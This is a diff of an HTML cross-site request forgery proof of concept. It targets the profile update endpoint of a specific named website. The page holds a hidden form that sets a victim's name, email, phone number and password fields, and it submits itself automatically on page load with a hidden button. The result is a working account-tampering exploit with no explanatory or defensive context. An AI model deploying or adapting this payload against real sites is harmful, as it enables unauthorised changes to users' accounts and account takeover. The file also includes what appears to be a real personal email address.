@@ -2,36 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF PoC</title>
 </head>
 <body>
-    <h1>CSRF Proof of Concept</h1>
-    <form id="csrfPoC" action="https://www.azhapasa.com/account/profile/update" method="POST" enctype="multipart/form-data">
-        <!-- CSRF Token -->
-        <input type="hidden" name="_token" value="Kor9WpsJjESrZUu75RR82eMfjvIeBlCEvJoW5maj">
-
-        <!-- Form Data (malicious) -->
-        <input type="hidden" name="name" value="Govinda">
-        <input type="hidden" name="email" value="govindaaupadhyaa51@example.com">
-        <input type="hidden" name="contact_no" value="1234567890">
-        <input type="hidden" name="password" value="NewP@ssw0rd!">
-        <input type="hidden" name="new_password" value="NewP@ssw0rd!">
-        <input type="hidden" name="confirm_password" value="NewP@ssw0rd!">
-        <input type="hidden" name="avatar" value="">
+    <h1>CSRF Attack in Progress</h1>
+    <form id="csrfForm" action="https://www.azhapasa.com/account/profile/update" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="name" value="Govin">
+        <input type="hidden" name="email" value="govindaaupadhyaa01@gmail.com">
+        <input type="hidden" name="contact_no" value="17725396">
+        <input type="hidden" name="password" value="#Govinda52">
+        <input type="hidden" name="new_password" value="">
+        <input type="hidden" name="confirm_password" value="">
         <input type="hidden" name="dzongkhag" value="">
         <input type="hidden" name="location" value="">
         <input type="hidden" name="lat" value="">
         <input type="hidden" name="long" value="">
-        <input type="hidden" name="address" value="nowhere">
-        <input type="hidden" name="work_address" value="nowhere">
-
-        <input type="submit" value="Submit CSRF Request">
+        <input type="hidden" name="address" value="">
+        <input type="hidden" name="work_address" value="">
+        <!-- Hidden submit button that triggers automatically -->
+        <input type="submit" style="display: none;">
     </form>
 
     <script>
-        // Automatically submit the form upon page load
-        document.getElementById('csrfPoC').submit();
+        // Automatically submits the form as soon as the page loads
+        document.getElementById('csrfForm').submit();
     </script>
 </body>
 </html>
+
